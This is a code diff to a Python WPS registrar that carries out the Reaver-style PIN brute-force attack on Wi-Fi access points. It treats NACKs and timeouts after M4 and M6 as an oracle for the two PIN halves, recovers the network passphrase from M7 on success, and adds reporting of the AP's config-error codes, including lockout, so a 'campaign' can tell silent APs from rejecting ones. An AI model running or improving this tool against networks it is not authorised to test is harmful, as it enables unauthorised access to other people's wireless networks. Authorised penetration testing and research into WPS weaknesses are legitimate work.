@@ -52,10 +52,33 @@ class AttemptOutcome:
     psk: Optional[str] = None             # Network Key recovered from M7, on SUCCESS
     ssid: Optional[str] = None
     detail: str = ""
+    config_error: Optional[int] = None    # WSC ATTR_CONFIG_ERROR from a NACK — the AP's stated reason
+    reached_m1: bool = False              # did the AP start the WSC exchange (send M1) at all?
 
     @property
     def first_half_ok(self) -> bool:
         return self.result in (PinResult.SECOND_HALF_WRONG, PinResult.SUCCESS)
+
+
+# WSC Config Error codes (WSC spec, ATTR_CONFIG_ERROR) — surfaced from a NACK so a
+# failure says *why*, not just "refused". 15 = the AP is telling us it's locked; 18 is
+# the closest thing to "wrong/rejected PIN". Which code(s) actually mean "advance past
+# this PIN" is AP-dependent and confirmed from hardware before we key advancement off it.
+WSC_CONFIG_ERRORS = {
+    0: "No Error", 1: "OOB Interface Read Error", 2: "Decryption CRC Failure",
+    3: "2.4GHz chan not supported", 4: "5GHz chan not supported", 5: "Signal too weak",
+    6: "Network auth failure", 7: "Network assoc failure", 8: "No DHCP response",
+    9: "Failed DHCP config", 10: "IP address conflict", 11: "Couldn't reach Registrar",
+    12: "Multiple PBC sessions", 13: "Rogue activity suspected", 14: "Device busy",
+    15: "Setup Locked", 16: "Message Timeout", 17: "Registration Session Timeout",
+    18: "Device Password Auth Failure",
+}
+
+
+def config_error_name(code: Optional[int]) -> str:
+    if code is None:
+        return "none"
+    return WSC_CONFIG_ERRORS.get(code, f"unknown(0x{code:02x})")
 
 
 class WpsRegistrar:
@@ -100,6 +123,12 @@ class WpsRegistrar:
         # answer the *current* stage (retry insurance) but ignore older ones,
         # rather than re-emitting a stale M2 after we've moved on to M4.
         highest_mt = 0
+        reached_m1 = False           # did the AP send M1 (WSC exchange actually started)?
+
+        def _out(result: PinResult, **kw) -> AttemptOutcome:
+            # Every outcome carries reached_m1 so the campaign can tell a silent AP
+            # (never talked WSC) from one that rejected mid-exchange.
+            return AttemptOutcome(result, pin, reached_m1=reached_m1, **kw)
 
         await self._send_1x(M.eapol_start())
         self.log(f"[WPS] -> EAPOL-Start (pin {pin})")
@@ -119,10 +148,10 @@ class WpsRegistrar:
                 # half-wrong oracle (reaver's timeout-as-NACK); otherwise the AP
                 # just isn't talking.
                 if last_sent == "M4":
-                    return AttemptOutcome(PinResult.FIRST_HALF_WRONG, pin, detail="timeout after M4")
+                    return _out(PinResult.FIRST_HALF_WRONG, detail="no reply after M4")
                 if last_sent == "M6":
-                    return AttemptOutcome(PinResult.SECOND_HALF_WRONG, pin, detail="timeout after M6")
-                return AttemptOutcome(PinResult.TIMEOUT, pin, detail="no EAP response")
+                    return _out(PinResult.SECOND_HALF_WRONG, detail="no reply after M6")
+                return _out(PinResult.TIMEOUT, detail="AP didn't respond")
 
             p = M.parse_rx_frame(frame)
             if p is None:
@@ -135,8 +164,22 @@ class WpsRegistrar:
                 continue
 
             if p.is_eap_failure or p.wsc_msg_type == M.WPS_WSC_NACK:
-                self.log(f"[WPS] <- {'EAP-FAIL' if p.is_eap_failure else 'WSC_NACK'} (last_sent={last_sent})")
-                return self._oracle_from_nack(pin, last_sent)
+                # De-swallow the AP's stated reason. A NACK is the AP *answering* with a
+                # config-error code (≠ silence); a timeout is "AP didn't respond".
+                ce_raw = p.attrs.get(M.ATTR_CONFIG_ERROR)
+                config_error = (int.from_bytes(ce_raw[:2], "big")
+                                if ce_raw and len(ce_raw) >= 2 else None)
+                kind = "EAP-FAIL" if p.is_eap_failure else "WSC_NACK"
+                self.log(f"[WPS] <- {kind} config_error={config_error_name(config_error)} "
+                         f"(last_sent={last_sent})")
+                if last_sent == "M4":
+                    return _out(PinResult.FIRST_HALF_WRONG, detail="NACK after M4",
+                                config_error=config_error)
+                if last_sent == "M6":
+                    return _out(PinResult.SECOND_HALF_WRONG, detail="NACK after M6",
+                                config_error=config_error)
+                return _out(PinResult.PROTO_ERROR, detail="NACK before oracle",
+                            config_error=config_error)
 
             mt = p.wsc_msg_type
             if mt and mt < highest_mt:
@@ -144,11 +187,12 @@ class WpsRegistrar:
             if mt in (M.WPS_M1, M.WPS_M3, M.WPS_M5, M.WPS_M7):
                 highest_mt = mt
             if mt == M.WPS_M1:
+                reached_m1 = True        # the AP is talking WSC, whatever happens next
                 pke = p.attrs.get(M.ATTR_PUBLIC_KEY)
                 nonce_e = p.attrs.get(M.ATTR_ENROLLEE_NONCE)
                 mac_e = p.attrs.get(M.ATTR_MAC_ADDR, self.bssid)
                 if not pke or not nonce_e:
-                    return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="M1 missing PKe/nonce")
+                    return _out(PinResult.PROTO_ERROR, detail="M1 missing PKe/nonce")
                 shared = wc.dh_shared_secret(pke, priv)
                 authkey, keywrapkey, _ = wc.derive_keys(shared, nonce_e, mac_e, nonce_r)
                 psk1, psk2 = wc.derive_psk(authkey, pin)
@@ -158,7 +202,7 @@ class WpsRegistrar:
 
             elif mt == M.WPS_M3:
                 if authkey is None:
-                    return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="M3 before keys")
+                    return _out(PinResult.PROTO_ERROR, detail="M3 before keys")
                 m4 = M.build_m4(nonce_e, r_s1, r_s2, psk1, psk2, pke, pkr,
                                 authkey, keywrapkey, p.raw_wsc_attrs)
                 await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m4))
@@ -178,24 +222,16 @@ class WpsRegistrar:
                 # Tear the session down politely (best-effort).
                 nack = M.build_wsc_nack(nonce_e, nonce_r)
                 await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_NACK, nack))
-                return AttemptOutcome(PinResult.SUCCESS, pin, psk=psk, ssid=ssid)
+                return _out(PinResult.SUCCESS, psk=psk, ssid=ssid)
 
             else:
                 # M2D or unexpected — treat as a setup rejection (often a lock).
                 if mt == M.WPS_M2D:
-                    return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="M2D (AP has no registrar)")
+                    return _out(PinResult.PROTO_ERROR, detail="M2D (AP has no registrar)")
                 self.log(f"[WPS] <- unexpected msg_type=0x{mt:02x}, ignoring")
                 continue
 
-        return AttemptOutcome(PinResult.TIMEOUT, pin, detail="exchange did not converge")
-
-    @staticmethod
-    def _oracle_from_nack(pin: str, last_sent: Optional[str]) -> AttemptOutcome:
-        if last_sent == "M4":
-            return AttemptOutcome(PinResult.FIRST_HALF_WRONG, pin, detail="NACK after M4")
-        if last_sent == "M6":
-            return AttemptOutcome(PinResult.SECOND_HALF_WRONG, pin, detail="NACK after M6")
-        return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="NACK before oracle")
+        return _out(PinResult.TIMEOUT, detail="AP didn't respond (exchange stalled)")
 
     @staticmethod
     def _extract_psk(p, keywrapkey):
